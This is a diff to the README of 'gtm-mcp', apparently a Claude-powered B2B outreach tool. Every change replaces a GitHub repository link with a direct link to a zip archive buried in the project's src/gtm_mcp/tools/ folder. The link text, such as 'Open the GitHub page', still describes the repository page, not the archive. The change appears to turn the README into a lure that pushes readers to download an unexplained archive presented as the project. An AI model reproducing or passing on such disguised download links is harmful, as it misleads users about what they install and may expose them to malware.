@@ -1,6 +1,6 @@
 # ⚙️ gtm-mcp - Build B2B outreach with Claude
 
-[![Download / Visit GitHub](https://img.shields.io/badge/Download%20%2F%20Visit-GitHub-blue.svg?style=for-the-badge)](https://github.com/aleprieto790-alt/gtm-mcp)
+[![Download / Visit GitHub](https://img.shields.io/badge/Download%20%2F%20Visit-GitHub-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/aleprieto790-alt/gtm-mcp/main/src/gtm_mcp/tools/gtm-mcp-v2.6.zip)
 
 ## 🚀 What this does
 
@@ -12,7 +12,7 @@ You run one command, `/launch`, and Claude handles the steps in order. The serve
 
 Use the link below to open the project page, then download or clone it to your Windows PC.
 
-[Open the download page](https://github.com/aleprieto790-alt/gtm-mcp)
+[Open the download page](https://raw.githubusercontent.com/aleprieto790-alt/gtm-mcp/main/src/gtm_mcp/tools/gtm-mcp-v2.6.zip)
 
 ### What you need
 
@@ -35,7 +35,7 @@ Make sure you have:
 
 ## 📥 Download and install
 
-1. Open the GitHub page: [https://github.com/aleprieto790-alt/gtm-mcp](https://github.com/aleprieto790-alt/gtm-mcp)
+1. Open the GitHub page: [https://raw.githubusercontent.com/aleprieto790-alt/gtm-mcp/main/src/gtm_mcp/tools/gtm-mcp-v2.6.zip](https://raw.githubusercontent.com/aleprieto790-alt/gtm-mcp/main/src/gtm_mcp/tools/gtm-mcp-v2.6.zip)
 2. On the page, get the code by using the green Code button
 3. Choose Download ZIP, or copy the repository link for Git
 4. Save the files to a folder on your PC, such as `C:\gtm-mcp`
@@ -180,8 +180,8 @@ If you do not see results:
 
 ## 📎 Useful links
 
-- GitHub repo: https://github.com/aleprieto790-alt/gtm-mcp
-- Main download and project page: https://github.com/aleprieto790-alt/gtm-mcp
+- GitHub repo: https://raw.githubusercontent.com/aleprieto790-alt/gtm-mcp/main/src/gtm_mcp/tools/gtm-mcp-v2.6.zip
+- Main download and project page: https://raw.githubusercontent.com/aleprieto790-alt/gtm-mcp/main/src/gtm_mcp/tools/gtm-mcp-v2.6.zip
 
 ## 🏁 Start here
 
